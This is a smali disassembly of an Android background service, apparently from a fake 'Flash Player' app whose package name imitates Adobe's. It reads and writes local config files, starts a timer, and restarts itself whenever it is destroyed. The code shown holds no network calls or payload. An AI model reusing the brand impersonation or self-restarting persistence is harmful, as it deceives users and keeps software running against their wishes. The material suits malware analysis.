.class public Lcom/adobe/flashplayer_/AZC;
.super Landroid/app/Service;
.source "AZC.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 28
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method static synthetic access$0(Lcom/adobe/flashplayer_/AZC;Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 114
    invoke-direct {p0, p1, p2}, Lcom/adobe/flashplayer_/AZC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;
    .locals 7
    .param p1, "config"    # Ljava/lang/String;
    .param p2, "context"    # Landroid/content/Context;

    .prologue
    .line 116
    const-string v4, ""

    .line 119
    .local v4, "ret":Ljava/lang/String;
    :try_start_0
    invoke-virtual {p2, p1}, Landroid/content/Context;->openFileInput(Ljava/lang/String;)Ljava/io/FileInputStream;

    move-result-object v1

    .line 121
    .local v1, "inputStream":Ljava/io/InputStream;
    if-eqz v1, :cond_0

    .line 122
    new-instance v2, Ljava/io/InputStreamReader;

    invoke-direct {v2, v1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 123
    .local v2, "inputStreamReader":Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 124
    .local v0, "bufferedReader":Ljava/io/BufferedReader;
    const-string v3, ""

    .line 125
    .local v3, "receiveString":Ljava/lang/String;
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 127
    .local v5, "stringBuilder":Ljava/lang/StringBuilder;
    :goto_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v3

    if-nez v3, :cond_1

    .line 131
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V

    .line 132
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 139
    .end local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .end local v1    # "inputStream":Ljava/io/InputStream;
    .end local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .end local v3    # "receiveString":Ljava/lang/String;
    .end local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :cond_0
    :goto_1
    return-object v4

    .line 128
    .restart local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .restart local v1    # "inputStream":Ljava/io/InputStream;
    .restart local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .restart local v3    # "receiveString":Ljava/lang/String;
    .restart local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :cond_1
    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    goto :goto_0

    .line 135
    .end local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .end local v1    # "inputStream":Ljava/io/InputStream;
    .end local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .end local v3    # "receiveString":Ljava/lang/String;
    .end local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :catch_0
    move-exception v6

    goto :goto_1

    .line 136
    :catch_1
    move-exception v6

    goto :goto_1
.end method

.method private writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 2
    .param p1, "config"    # Ljava/lang/String;
    .param p2, "data"    # Ljava/lang/String;
    .param p3, "context"    # Landroid/content/Context;

    .prologue
    .line 144
    :try_start_0
    new-instance v0, Ljava/io/OutputStreamWriter;

    const/4 v1, 0x0

    invoke-virtual {p3, p1, v1}, Landroid/content/Context;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    .line 145
    .local v0, "outputStreamWriter":Ljava/io/OutputStreamWriter;
    invoke-virtual {v0, p2}, Ljava/io/OutputStreamWriter;->write(Ljava/lang/String;)V

    .line 146
    invoke-virtual {v0}, Ljava/io/OutputStreamWriter;->close()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 150
    .end local v0    # "outputStreamWriter":Ljava/io/OutputStreamWriter;
    :goto_0
    return-void

    .line 148
    :catch_0
    move-exception v1

    goto :goto_0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 155
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 7

    .prologue
    .line 34
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 39
    const/4 v6, 0x0

    .line 42
    .local v6, "ff":Z
    new-instance v0, Lcom/adobe/flashplayer_/AZC$1;

    const-wide/32 v2, 0x15f90

    const-wide/16 v4, 0x64

    move-object v1, p0

    invoke-direct/range {v0 .. v5}, Lcom/adobe/flashplayer_/AZC$1;-><init>(Lcom/adobe/flashplayer_/AZC;JJ)V

    .line 108
    invoke-virtual {v0}, Lcom/adobe/flashplayer_/AZC$1;->start()Landroid/os/CountDownTimer;

    .line 110
    return-void
.end method

.method public onDestroy()V
    .locals 2

    .prologue
    .line 160
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/adobe/flashplayer_/AZC;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/adobe/flashplayer_/AZC;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 161
    return-void
.end method
